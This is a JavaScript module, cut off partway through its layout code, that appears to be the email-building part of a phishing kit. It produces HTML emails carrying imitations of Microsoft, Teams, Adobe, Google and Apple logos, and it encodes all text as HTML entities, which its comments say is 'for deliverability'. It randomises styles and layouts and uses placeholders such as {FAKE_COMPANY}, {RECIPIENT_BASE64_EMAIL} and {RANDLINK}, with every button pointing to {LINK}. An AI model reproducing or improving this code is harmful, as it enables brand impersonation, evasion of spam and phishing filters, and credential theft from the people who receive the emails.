/**
 * Email Template Generator
 * Creates professionally formatted emails with HTML entity encoding
 * Multiple styles available for variety
 */

/**
 * Helper to obfuscate strings with HTML entities
 */
function obfuscateString(str) {
    return str.split('').map(char => `&#${char.charCodeAt(0)};`).join('');
}

/**
 * Pre-built brand logos (obfuscated for deliverability)
 * All text and URLs are HTML entity encoded
 */
export const BRAND_LOGOS = {
    // Microsoft - Table-based 4-color squares (better email compatibility)
    microsoft: `<table cellpadding="0" cellspacing="1" border="0" style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#105;&#110;&#108;&#105;&#110;&#101;&#45;&#98;&#108;&#111;&#99;&#107;&#59;">
        <tr>
            <td style="&#119;&#105;&#100;&#116;&#104;&#58;&#50;&#48;&#112;&#120;&#59;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#50;&#48;&#112;&#120;&#59;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#45;&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#102;&#50;&#53;&#48;&#50;&#50;&#59;"></td>
            <td style="&#119;&#105;&#100;&#116;&#104;&#58;&#50;&#48;&#112;&#120;&#59;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#50;&#48;&#112;&#120;&#59;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#45;&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#55;&#102;&#98;&#97;&#48;&#48;&#59;"></td>
        </tr>
        <tr>
            <td style="&#119;&#105;&#100;&#116;&#104;&#58;&#50;&#48;&#112;&#120;&#59;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#50;&#48;&#112;&#120;&#59;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#45;&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#48;&#48;&#97;&#52;&#101;&#102;&#59;"></td>
            <td style="&#119;&#105;&#100;&#116;&#104;&#58;&#50;&#48;&#112;&#120;&#59;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#50;&#48;&#112;&#120;&#59;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#45;&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#102;&#102;&#98;&#57;&#48;&#48;&#59;"></td>
        </tr>
    </table>`,
    
    // Teams - Official logo with obfuscated URL
    teams: `<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#115;&#116;&#97;&#116;&#105;&#99;&#115;&#46;&#116;&#101;&#97;&#109;&#115;&#46;&#99;&#100;&#110;&#46;&#108;&#105;&#118;&#101;&#46;&#110;&#101;&#116;&#47;&#101;&#118;&#101;&#114;&#103;&#114;&#101;&#101;&#110;&#45;&#97;&#115;&#115;&#101;&#116;&#115;&#47;&#105;&#99;&#111;&#110;&#115;&#47;&#84;&#101;&#97;&#109;&#115;&#95;&#76;&#111;&#103;&#111;&#95;&#118;&#50;&#48;&#50;&#53;&#95;&#56;&#48;&#120;&#56;&#48;&#46;&#112;&#110;&#103;" width="50" height="50" alt="&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#84;&#101;&#97;&#109;&#115;" style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#98;&#108;&#111;&#99;&#107;&#59;&#98;&#111;&#114;&#100;&#101;&#114;&#58;&#48;&#59;">`,
    
    // Adobe - Official logo with obfuscated URL
    adobe: `<img src="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#97;&#100;&#111;&#98;&#101;&#46;&#99;&#111;&#109;&#47;&#102;&#101;&#100;&#101;&#114;&#97;&#108;&#47;&#97;&#115;&#115;&#101;&#116;&#115;&#47;&#115;&#118;&#103;&#115;&#47;&#97;&#100;&#111;&#98;&#101;&#45;&#108;&#111;&#103;&#111;&#46;&#115;&#118;&#103;" width="80" height="44" alt="&#65;&#100;&#111;&#98;&#101;" style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#98;&#108;&#111;&#99;&#107;&#59;&#98;&#111;&#114;&#100;&#101;&#114;&#58;&#48;&#59;">`,
    
    // Google - CSS text with obfuscated letters
    google: `<div style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#105;&#110;&#108;&#105;&#110;&#101;&#45;&#98;&#108;&#111;&#99;&#107;&#59;&#102;&#111;&#110;&#116;&#45;&#102;&#97;&#109;&#105;&#108;&#121;&#58;&#65;&#114;&#105;&#97;&#108;&#44;&#115;&#97;&#110;&#115;&#45;&#115;&#101;&#114;&#105;&#102;&#59;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#50;&#52;&#112;&#120;&#59;&#102;&#111;&#110;&#116;&#45;&#119;&#101;&#105;&#103;&#104;&#116;&#58;&#53;&#48;&#48;&#59;">
        <span style="&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#52;&#50;&#56;&#53;&#70;&#52;&#59;">&#71;</span><span style="&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#69;&#65;&#52;&#51;&#51;&#53;&#59;">&#111;</span><span style="&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#70;&#66;&#66;&#67;&#48;&#53;&#59;">&#111;</span><span style="&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#52;&#50;&#56;&#53;&#70;&#52;&#59;">&#103;</span><span style="&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#51;&#52;&#65;&#56;&#53;&#51;&#59;">&#108;</span><span style="&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#69;&#65;&#52;&#51;&#51;&#53;&#59;">&#101;</span>
    </div>`,
    
    // Apple - CSS symbol (already entity encoded)
    apple: `<div style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#105;&#110;&#108;&#105;&#110;&#101;&#45;&#98;&#108;&#111;&#99;&#107;&#59;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#50;&#56;&#112;&#120;&#59;&#99;&#111;&#108;&#111;&#114;&#58;&#35;&#53;&#53;&#53;&#53;&#53;&#53;&#59;">&#63743;</div>`,
    
    // Generic gradient (obfuscated styles)
    generic: `<div style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#105;&#110;&#108;&#105;&#110;&#101;&#45;&#98;&#108;&#111;&#99;&#107;&#59;&#119;&#105;&#100;&#116;&#104;&#58;&#52;&#48;&#112;&#120;&#59;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#52;&#48;&#112;&#120;&#59;&#98;&#97;&#99;&#107;&#103;&#114;&#111;&#117;&#110;&#100;&#58;&#108;&#105;&#110;&#101;&#97;&#114;&#45;&#103;&#114;&#97;&#100;&#105;&#101;&#110;&#116;&#40;&#49;&#51;&#53;&#100;&#101;&#103;&#44;&#35;&#54;&#54;&#55;&#101;&#101;&#97;&#32;&#48;&#37;&#44;&#35;&#55;&#54;&#52;&#98;&#97;&#50;&#32;&#49;&#48;&#48;&#37;&#41;&#59;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#114;&#97;&#100;&#105;&#117;&#115;&#58;&#56;&#112;&#120;&#59;"></div>`
};

/**
 * List of all valid placeholders that should NOT be encoded
 */
const PLACEHOLDERS = [
    '{RECIPIENT_NAME}',
    '{RECIPIENT_EMAIL}',
    '{RECIPIENT_DOMAIN}',
    '{RECIPIENT_DOMAIN_NAME}',
    '{RECIPIENT_BASE64_EMAIL}',
    '{CURRENT_DATE}',
    '{CURRENT_TIME}',
    '{RANDOM_NUMBER10}',
    '{RANDOM_STRING}',
    '{RANDOM_MD5}',
    '{RANDOM_PATH}',
    '{FAKE_COMPANY}',
    '{FAKE_COMPANY_EMAIL}',
    '{FAKE_COMPANY_EMAIL_AND_FULLNAME}',
    '{LINK}',
    '{CTA_LINK}',
    '{RANDLINK}',
    '{QR_CODE}'
];

/**
 * Convert text to HTML numeric entities, but PRESERVE placeholders
 */
export function encodeToEntities(text) {
    if (!text) return '';
    
    // First, temporarily replace placeholders and HTML tags with unique tokens
    let result = text;
    const preserveMap = new Map();
    let tokenIndex = 0;
    
    // Preserve placeholders
    PLACEHOLDERS.forEach((placeholder) => {
        const token = `__PRESERVE_${tokenIndex++}__`;
        const regex = new RegExp(placeholder.replace(/[{}]/g, '\\$&'), 'g');
        result = result.replace(regex, token);
        preserveMap.set(token, placeholder);
    });
    
    // Preserve <br> tags (various formats)
    const brPatterns = [/<br\s*\/?>/gi, /<br>/gi, /<\/br>/gi];
    brPatterns.forEach(pattern => {
        result = result.replace(pattern, () => {
            const token = `__PRESERVE_${tokenIndex++}__`;
            preserveMap.set(token, '<br>');
            return token;
        });
    });
    
    // Encode the text (without preserved items)
    result = result.split('').map(char => {
        const code = char.charCodeAt(0);
        // Keep newlines and basic whitespace, encode everything else
        if (code === 10) return '<br>';
        if (code === 13) return '';
        return `&#${code};`;
    }).join('');
    
    // Restore preserved items (they stay as plain text/HTML, not encoded)
    preserveMap.forEach((original, token) => {
        const tokenRegex = new RegExp(token.split('').map(c => `&#${c.charCodeAt(0)};`).join(''), 'g');
        result = result.replace(tokenRegex, original);
    });
    
    return result;
}

/**
 * Available template styles
 */
export const TEMPLATE_STYLES = {
    corporate: {
        name: 'Corporate Professional',
        bgColor: '#f4f4f4',
        cardBg: '#ffffff',
        primaryColor: '#2c3e50',
        accentColor: '#3498db',
        textColor: '#333333',
        mutedColor: '#777777',
        fontFamily: 'Segoe UI, Arial, sans-serif',
        borderRadius: '4px'
    },
    modern: {
        name: 'Modern Minimal',
        bgColor: '#ffffff',
        cardBg: '#fafafa',
        primaryColor: '#1a1a1a',
        accentColor: '#6366f1',
        textColor: '#374151',
        mutedColor: '#9ca3af',
        fontFamily: 'Inter, -apple-system, sans-serif',
        borderRadius: '12px'
    },
    elegant: {
        name: 'Elegant Classic',
        bgColor: '#f8f5f2',
        cardBg: '#ffffff',
        primaryColor: '#2d2926',
        accentColor: '#8b7355',
        textColor: '#4a4543',
        mutedColor: '#8a8583',
        fontFamily: 'Georgia, Times New Roman, serif',
        borderRadius: '2px'
    },
    tech: {
        name: 'Tech Forward',
        bgColor: '#0f172a',
        cardBg: '#1e293b',
        primaryColor: '#f1f5f9',
        accentColor: '#22d3ee',
        textColor: '#e2e8f0',
        mutedColor: '#94a3b8',
        fontFamily: 'SF Pro Display, -apple-system, sans-serif',
        borderRadius: '8px'
    },
    friendly: {
        name: 'Friendly & Warm',
        bgColor: '#fef3c7',
        cardBg: '#ffffff',
        primaryColor: '#92400e',
        accentColor: '#f59e0b',
        textColor: '#78350f',
        mutedColor: '#a16207',
        fontFamily: 'Nunito, Verdana, sans-serif',
        borderRadius: '16px'
    },
    healthcare: {
        name: 'Healthcare Trust',
        bgColor: '#ecfdf5',
        cardBg: '#ffffff',
        primaryColor: '#065f46',
        accentColor: '#10b981',
        textColor: '#064e3b',
        mutedColor: '#6b7280',
        fontFamily: 'Open Sans, Arial, sans-serif',
        borderRadius: '6px'
    },
    finance: {
        name: 'Finance Professional',
        bgColor: '#f0f9ff',
        cardBg: '#ffffff',
        primaryColor: '#0c4a6e',
        accentColor: '#0284c7',
        textColor: '#1e3a5f',
        mutedColor: '#64748b',
        fontFamily: 'Roboto, Helvetica, sans-serif',
        borderRadius: '4px'
    },
    creative: {
        name: 'Creative Bold',
        bgColor: '#fdf4ff',
        cardBg: '#ffffff',
        primaryColor: '#701a75',
        accentColor: '#d946ef',
        textColor: '#4a044e',
        mutedColor: '#a855f7',
        fontFamily: 'Poppins, Arial, sans-serif',
        borderRadius: '20px'
    },
    notification: {
        name: 'System Notification',
        bgColor: '#f9fafb',
        cardBg: '#ffffff',
        primaryColor: '#111827',
        accentColor: '#6366f1',
        textColor: '#374151',
        mutedColor: '#6b7280',
        fontFamily: 'system-ui, -apple-system, sans-serif',
        borderRadius: '8px'
    },
    newsletter: {
        name: 'Newsletter Style',
        bgColor: '#f3f4f6',
        cardBg: '#ffffff',
        primaryColor: '#1f2937',
        accentColor: '#ef4444',
        textColor: '#4b5563',
        mutedColor: '#9ca3af',
        fontFamily: 'Merriweather, Georgia, serif',
        borderRadius: '0px'
    }
};

/**
 * Get a random style or specific style
 * Prefers professional/corporate styles for legitimate business communication
 */
export function getTemplateStyle(styleName = null) {
    if (styleName && TEMPLATE_STYLES[styleName]) {
        return TEMPLATE_STYLES[styleName];
    }
    
    // Preferred professional styles (weighted more heavily)
    const professionalStyles = ['corporate', 'finance', 'notification', 'modern', 'elegant'];
    const otherStyles = ['tech', 'healthcare', 'friendly', 'creative', 'newsletter'];
    
    // 70% chance of professional style, 30% chance of other
    const useProStyle = Math.random() < 0.7;
    const stylePool = useProStyle ? professionalStyles : otherStyles;
    const randomStyle = stylePool[Math.floor(Math.random() * stylePool.length)];
    
    return { ...TEMPLATE_STYLES[randomStyle], styleName: randomStyle };
}

/**
 * Generate the full email HTML with encoded content and varied styles
 */
export function generateEmailTemplate(content, options = {}) {
    const {
        logoUrl = '',
        logoAlt = 'Logo',
        brandLogo = null, // Use pre-built brand logo: 'microsoft', 'google', 'apple', 'generic'
        primaryColor = '',
        buttonUrl = '{LINK}',
        secondaryButtonUrl = '{LINK}',
        secondaryButtonText = '',
        showSecondaryButton = false,
        templateStyle = null,
        layout = null
    } = options;
    
    console.log('[Template] Button URL:', buttonUrl);
    console.log('[Template] Secondary Button URL:', secondaryButtonUrl);

    // Get random or specified style
    const style = getTemplateStyle(templateStyle);
    const finalPrimaryColor = primaryColor || style.accentColor;
    
    // Choose random layout if not specified
    const layouts = ['centered', 'left-aligned', 'card', 'minimal', 'bold-header', 'split'];
    const chosenLayout = layout || layouts[Math.floor(Math.random() * layouts.length)];

    // Logo HTML - supports brand logo, URL, or none
    let logoHtml = '';
    if (brandLogo && BRAND_LOGOS[brandLogo]) {
        logoHtml = BRAND_LOGOS[brandLogo];
    } else if (logoUrl) {
        logoHtml = `<img src="${logoUrl}" width="60" height="60" alt="${logoAlt}" style="display:block;border:0;outline:none;text-decoration:none;border-radius:${style.borderRadius};">`;
    }

    // Encode all text content
    const encodedTitle = encodeToEntities(content.title || 'Notification');
    const encodedSubtitle = encodeToEntities(content.subtitle || '');
    const encodedBody = encodeToEntities(content.body || '');
    const encodedBoxTitle = encodeToEntities(content.boxTitle || '');
    const encodedBoxContent = encodeToEntities(content.boxContent || '');
    const encodedBoxFooter = encodeToEntities(content.boxFooter || '');
    const encodedButtonText = encodeToEntities(content.buttonText || 'View Now');
    const encodedSecondaryButtonText = encodeToEntities(secondaryButtonText || content.secondaryButtonText || 'Learn More');
    const encodedFooter = encodeToEntities(content.footer || 'You are receiving this email based on your account settings.');
    const encodedDisclaimer = encodeToEntities(content.disclaimer || 'This message was automatically generated.');
    const encodedLogoAlt = encodeToEntities(logoAlt);

    // Generate template based on layout
    const html = generateLayoutTemplate(chosenLayout, {
        style,
        logoUrl,
        logoHtml,
        encodedLogoAlt,
        brandLogo,  // Pass brand logo to template
        logoAlt,    // Pass original logoAlt to check for default
        finalPrimaryColor,
        buttonUrl,
        secondaryButtonUrl,
        showSecondaryButton,
        encodedTitle,
        encodedSubtitle,
        encodedBody,
        encodedBoxTitle,
        encodedBoxContent,
        encodedBoxFooter,
        encodedButtonText,
        encodedSecondaryButtonText,
        encodedFooter,
        encodedDisclaimer,
        content
    });
    
    // Fix any placeholder case issues in the final HTML
    let finalHtml = html
        .replace(/\{link\}/gi, '{LINK}')
        .replace(/\{randlink\}/gi, '{RANDLINK}')
        .replace(/\{recipient_name\}/gi, '{RECIPIENT_NAME}')
        .replace(/\{recipient_email\}/gi, '{RECIPIENT_EMAIL}')
        .replace(/\{recipient_domain\}/gi, '{RECIPIENT_DOMAIN}')
        .replace(/\{recipient_domain_name\}/gi, '{RECIPIENT_DOMAIN_NAME}')
        .replace(/\{recipient_base64_email\}/gi, '{RECIPIENT_BASE64_EMAIL}')
        .replace(/\{current_date\}/gi, '{CURRENT_DATE}')
        .replace(/\{current_time\}/gi, '{CURRENT_TIME}')
        .replace(/\{random_number10\}/gi, '{RANDOM_NUMBER10}')
        .replace(/\{random_string\}/gi, '{RANDOM_STRING}')
        .replace(/\{random_md5\}/gi, '{RANDOM_MD5}')
        .replace(/\{random_path\}/gi, '{RANDOM_PATH}')
        .replace(/\{fake_company\}/gi, '{FAKE_COMPANY}')
        .replace(/\{fake_company_email\}/gi, '{FAKE_COMPANY_EMAIL}')
        .replace(/\{fake_company_email_and_fullname\}/gi, '{FAKE_COMPANY_EMAIL_AND_FULLNAME}')
        .replace(/\{cta_link\}/gi, '{LINK}')
        .replace(/\{qr_code\}/gi, '{QR_CODE}');
    
    // Also fix HTML-encoded {Link} variations
    // &#123; = {, &#76; = L, &#105; = i, &#110; = n, &#107; = k, &#125; = }
    finalHtml = finalHtml
        .replace(/&#123;&#76;&#105;&#110;&#107;&#125;/gi, '{LINK}')    // {Link} encoded
        .replace(/&#123;&#108;&#105;&#110;&#107;&#125;/gi, '{LINK}')   // {link} encoded
        .replace(/&#123;[Ll]ink&#125;/gi, '{LINK}')                    // Partially encoded
        .replace(/\{[Ll][Ii][Nn][Kk]\}/g, '{LINK}')                   // Case variations
    
    // Debug: Verify {LINK} is in output
    const hasLink = finalHtml.includes('{LINK}');
    console.log('[Template] Output has {LINK}:', hasLink);
    
    return finalHtml;
}

/**
 * Generate template based on layout type
 */
function generateLayoutTemplate(layout, data) {
    const { style, logoUrl, logoHtml, encodedLogoAlt, brandLogo, logoAlt, finalPrimaryColor, buttonUrl, secondaryButtonUrl,
            showSecondaryButton, encodedTitle, encodedSubtitle, encodedBody, encodedBoxTitle,
            encodedBoxContent, encodedBoxFooter, encodedButtonText, encodedSecondaryButtonText,
            encodedFooter, encodedDisclaimer, content } = data;

    const baseHead = `<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
<!--[if gte mso 9]><xml><o:OfficeDocumentSettings><o:AllowPNG/><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml><![endif]-->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="x-apple-disable-message-reformatting">
<!--[if !mso]><!--><meta http-equiv="X-UA-Compatible" content="IE=edge"><!--<![endif]-->
<title>${encodedTitle}</title>
<style type="text/css">
@media only screen and (max-width: 620px) {
  .email-container { width: 100% !important; padding: 10px !important; }
  .content-block { padding: 20px !important; }
  .button { width: 100% !important; text-align: center !important; }
}
body { margin: 0; padding: 0; -webkit-text-size-adjust: 100%; }
table, td, tr { border-collapse: collapse; vertical-align: top; }
p { margin: 0; }
* { line-height: inherit; }
a[x-apple-data-detectors=true] { color: inherit !important; text-decoration: none !important; }
</style>
</head>`;

    // Format body text with proper line breaks and styling
    const formatTextWithBreaks = (text) => {
        if (!text) return '';
        return text
            // Handle HTML-encoded newlines first (&#92; = \, &#110; = n)
            .replace(/&#92;&#110;&#92;&#110;/g, '<br><br>')
            .replace(/&#92;&#110;/g, '<br>')
            // Handle literal \n strings
            .replace(/\\n\\n/g, '<br><br>')
            .replace(/\\n/g, '<br>')
            // Handle actual newlines
            .replace(/\n\n/g, '<br><br>')
            .replace(/\n/g, '<br>')
            .replace(/•/g, '&bull;')
            .replace(/(\d+️⃣)/g, '<strong>$1</strong>')
            .replace(/(✅|❌|⏳|📌|📊|📈|🔔|💡|🎯)/g, '<span style="font-size:16px;">$1</span>');
    };
    
    // Format box content into a proper table/list
    const formatBoxContent = (boxContent, boxTitle) => {
        if (!boxContent) return '';
        
        const lines = boxContent.split(/\\n|\n/).filter(l => l.trim());
        
        // Detect if it's key-value pairs (contains : )
        const isKeyValue = lines.some(l => l.includes(':') && !l.includes('http'));
        
        // Detect if it's a numbered/checkbox list
        const isList = lines.some(l => /^[✅❌⬜⏳\d️⃣•➡️🔹]/u.test(l.trim()));
        
        if (isKeyValue) {
            // Render as a proper table
            const rows = lines.map(line => {
                const colonIdx = line.indexOf(':');
                if (colonIdx > 0 && colonIdx < 30) {
                    const key = encodeToEntities(line.substring(0, colonIdx).trim());
                    const value = encodeToEntities(line.substring(colonIdx + 1).trim());
                    return `<tr>
                        <td style="padding:8px 12px 8px 0;font-size:13px;color:${style.mutedColor};white-space:nowrap;vertical-align:top;">${key}</td>
                        <td style="padding:8px 0;font-size:13px;color:${style.textColor};font-weight:500;">${value}</td>
                    </tr>`;
                }
                return `<tr><td colspan="2" style="padding:6px 0;font-size:13px;color:${style.textColor};">${encodeToEntities(line)}</td></tr>`;
            }).join('');
            
            return `<table role="presentation" cellpadding="0" cellspacing="0" style="width:100%;">${rows}</table>`;
        } else if (isList) {
            // Render as a styled list
            const items = lines.map(line => {
                return `<div style="padding:6px 0;font-size:13px;color:${style.textColor};display:flex;align-items:flex-start;">
                    <span style="margin-right:8px;font-size:15px;">${line.charAt(0).match(/[✅❌⬜⏳•➡️🔹\d]/u) ? '' : '•'}</span>
                    <span>${encodeToEntities(line)}</span>
                </div>`;
            }).join('');
            return items;
        } else {
            // Plain text with line breaks
            return `<p style="margin:0;font-size:13px;color:${style.textColor};line-height:1.7;">${formatTextWithBreaks(encodeToEntities(boxContent))}</p>`;
        }
    };
    
    // Enhanced info box HTML with proper formatting
    const infoBoxHtml = (content.boxTitle || content.boxContent) ? `
<div style="background:linear-gradient(135deg, ${style.cardBg} 0%, ${style.bgColor} 100%);border:1px solid ${style.mutedColor}20;border-left:4px solid ${finalPrimaryColor};padding:20px;margin:24px 0;border-radius:${style.borderRadius};">
${content.boxTitle ? `<p style="margin:0 0 12px 0;font-size:15px;font-weight:600;color:${style.primaryColor};">${encodedBoxTitle}</p>` : ''}
${content.boxContent ? formatBoxContent(content.boxContent, content.boxTitle) : ''}
${content.boxFooter ? `<p style="margin:12px 0 0 0;font-size:12px;color:${style.mutedColor};font-style:italic;">${encodedBoxFooter}</p>` : ''}
</div>` : '';

    // Secondary button
    const secondaryBtnHtml = (showSecondaryButton || content.secondaryButtonText) ? `
<a href="${secondaryButtonUrl || buttonUrl}" style="background:${style.cardBg};color:${style.textColor};text-decoration:none;padding:12px 24px;border-radius:${style.borderRadius};font-size:14px;font-weight:500;display:inline-block;border:1px solid ${style.mutedColor};margin-left:10px;">
${encodedSecondaryButtonText}
</a>` : '';

    switch(layout) {
        case 'centered':
            return `${baseHead}
<body style="margin:0;padding:0;background-color:${style.bgColor};">
<table role="presentation" width="100%" style="background-color:${style.bgColor};" cellpadding="0" cellspacing="0">
<tr><td style="padding:40px 20px;">
<table role="presentation" class="email-container" width="600" align="center" style="max-width:600px;margin:auto;background:${style.cardBg};border-radius:${style.borderRadius};box-shadow:0 2px 8px rgba(0,0,0,0.08);" cellpadding="0" cellspacing="0">
<tr><td class="content-block" style="padding:40px;text-align:center;font-family:${style.fontFamily};">

${logoHtml ? `<div style="margin-bottom:24px;">${logoHtml}</div>` : ''}

<h1 style="margin:0 0 16px 0;font-size:24px;font-weight:700;color:${style.primaryColor};line-height:1.3;">
${encodedTitle}
</h1>

${content.subtitle ? `<p style="font-size:16px;color:${style.mutedColor};margin-bottom:20px;">${encodedSubtitle}</p>` : ''}

<div style="font-size:15px;color:${style.textColor};line-height:1.8;margin-bottom:24px;text-align:left;">
${formatTextWithBreaks(encodedBody)}
</div>

${infoBoxHtml}

<div style="margin:28px 0;">
<a href="${buttonUrl}" style="background:${finalPrimaryColor};color:#ffffff;text-decoration:none;padding:14px 32px;border-radius:${style.borderRadius};font-size:15px;font-weight:600;display:inline-block;">
${encodedButtonText}
</a>
${secondaryBtnHtml}
</div>

<hr style="margin:32px 0;border:none;border-top:1px solid ${style.mutedColor}20;">
<p style="font-size:12px;color:${style.mutedColor};line-height:1.6;">${encodedFooter}</p>
<p style="font-size:11px;color:${style.mutedColor};margin-top:12px;">${encodedDisclaimer}</p>

</td></tr>
</table>
</td></tr>
</table>
</body></html>`;

        case 'left-aligned':
            return `${baseHead}
<body style="margin:0;padding:0;background-color:${style.bgColor};">
<table role="presentation" width="100%" style="background-color:${style.bgColor};" cellpadding="0" cellspacing="0">
<tr><td style="padding:30px 20px;">
<table role="presentation" class="email-container" width="600" align="center" style="max-width:600px;margin:auto;background:${style.cardBg};border-radius:${style.borderRadius};" cellpadding="0" cellspacing="0">
<tr><td class="content-block" style="padding:36px;font-family:${style.fontFamily};">

<table width="100%" cellpadding="0" cellspacing="0"><tr>
<td width="60">${logoHtml}</td>
</tr></table>

<h1 style="margin:28px 0 12px 0;font-size:26px;font-weight:700;color:${style.primaryColor};line-height:1.2;">
${encodedTitle}
</h1>

${content.subtitle ? `<p style="font-size:15px;color:${style.accentColor};margin-bottom:20px;font-weight:500;">${encodedSubtitle}</p>` : ''}

<div style="font-size:15px;color:${style.textColor};line-height:1.8;margin-bottom:20px;">
${formatTextWithBreaks(encodedBody)}
</div>

${infoBoxHtml}

<table cellpadding="0" cellspacing="0" style="margin:24px 0;"><tr>
<td><a href="${buttonUrl}" style="background:${finalPrimaryColor};color:#ffffff;text-decoration:none;padding:12px 28px;border-radius:${style.borderRadius};font-size:14px;font-weight:600;display:block;">${encodedButtonText}</a></td>
${(showSecondaryButton || content.secondaryButtonText) ? `<td style="padding-left:12px;"><a href="${secondaryButtonUrl || buttonUrl}" style="color:${finalPrimaryColor};text-decoration:none;font-size:14px;font-weight:500;">${encodedSecondaryButtonText} →</a></td>` : ''}
</tr></table>

<hr style="margin:28px 0;border:none;border-top:1px solid ${style.mutedColor}30;">
<p style="font-size:11px;color:${style.mutedColor};line-height:1.6;">${encodedFooter}</p>
<p style="font-size:10px;color:${style.mutedColor};margin-top:8px;">${encodedDisclaimer}</p>

</td></tr>
</table>
</td></tr>
</table>
</body></html>`;

        case 'card':
            return `${baseHead}
<body style="margin:0;padding:0;background-color:${style.bgColor};">
<table role="presentation" width="100%" style="background-color:${style.bgColor};" cellpadding="0" cellspacing="0">
<tr><td style="padding:50px 20px;">

<table role="presentation" width="500" align="center" style="max-width:500px;margin:auto;" cellpadding="0" cellspacing="0">

${logoHtml ? `<tr><td style="text-align:center;padding-bottom:24px;">${logoHtml}</td></tr>` : ''}

<tr><td>
<table role="presentation" width="100%" style="background:${style.cardBg};border-radius:${style.borderRadius};box-shadow:0 4px 20px rgba(0,0,0,0.1);overflow:hidden;" cellpadding="0" cellspacing="0">

<tr><td style="background:${finalPrimaryColor};padding:24px 32px;">
<h1 style="margin:0;font-size:20px;font-weight:600;color:#ffffff;font-family:${style.fontFamily};">
${encodedTitle}
</h1>
${content.subtitle ? `<p style="margin:8px 0 0 0;font-size:14px;color:rgba(255,255,255,0.85);font-family:${style.fontFamily};">${encodedSubtitle}</p>` : ''}
</td></tr>

<tr><td style="padding:28px 32px;font-family:${style.fontFamily};">
<p style="font-size:15px;color:${style.textColor};line-height:1.7;margin:0;">
${encodedBody}
</p>

${infoBoxHtml}

<div style="margin-top:24px;">
<a href="${buttonUrl}" style="background:${finalPrimaryColor};color:#ffffff;text-decoration:none;padding:14px 28px;border-radius:${style.borderRadius};font-size:14px;font-weight:600;display:inline-block;">
${encodedButtonText}
</a>
</div>
</td></tr>

</table>
</td></tr>

<tr><td style="padding-top:24px;text-align:center;font-family:${style.fontFamily};">
<p style="font-size:11px;color:${style.mutedColor};line-height:1.5;">${encodedFooter}</p>
<p style="font-size:10px;color:${style.mutedColor};margin-top:8px;">${encodedDisclaimer}</p>
</td></tr>

</table>

</td></tr>
</table>
</body></html>`;

        case 'minimal':
            return `${baseHead}
<body style="margin:0;padding:0;background-color:${style.cardBg};">
<table role="presentation" width="100%" cellpadding="0" cellspacing="0">
<tr><td style="padding:60px 20px;">
<table role="presentation" width="520" align="center" style="max-width:520px;margin:auto;font-family:${style.fontFamily};" cellpadding="0" cellspacing="0">

${logoHtml ? `<tr><td style="padding-bottom:40px;">${logoHtml}</td></tr>` : ''}

<tr><td>
<h1 style="margin:0 0 24px 0;font-size:32px;font-weight:300;color:${style.primaryColor};line-height:1.2;letter-spacing:-0.5px;">
${encodedTitle}
</h1>

${content.subtitle ? `<p style="font-size:18px;color:${style.accentColor};margin-bottom:24px;font-weight:400;">${encodedSubtitle}</p>` : ''}

<p style="font-size:16px;color:${style.textColor};line-height:1.8;margin-bottom:32px;">
${encodedBody}
</p>

${infoBoxHtml}

<a href="${buttonUrl}" style="color:${finalPrimaryColor};text-decoration:none;font-size:16px;font-weight:500;border-bottom:2px solid ${finalPrimaryColor};padding-bottom:2px;">
${encodedButtonText} →
</a>

<hr style="margin:48px 0 24px 0;border:none;border-top:1px solid ${style.mutedColor}20;">
<p style="font-size:12px;color:${style.mutedColor};line-height:1.6;">${encodedFooter}</p>
</td></tr>

</table>
</td></tr>
</table>
</body></html>`;

        case 'bold-header':
            return `${baseHead}
<body style="margin:0;padding:0;background-color:${style.bgColor};">
<table role="presentation" width="100%" cellpadding="0" cellspacing="0">

<tr><td style="background:linear-gradient(135deg, ${finalPrimaryColor} 0%, ${style.primaryColor} 100%);padding:60px 20px 80px 20px;text-align:center;">
${logoHtml ? `<div style="margin-bottom:20px;">${logoHtml}</div>` : ''}
<h1 style="margin:0;font-size:28px;font-weight:700;color:#ffffff;font-family:${style.fontFamily};text-shadow:0 2px 4px rgba(0,0,0,0.1);">
${encodedTitle}
</h1>
${content.subtitle ? `<p style="margin:12px 0 0 0;font-size:16px;color:rgba(255,255,255,0.9);font-family:${style.fontFamily};">${encodedSubtitle}</p>` : ''}
</td></tr>

<tr><td style="padding:0 20px;">
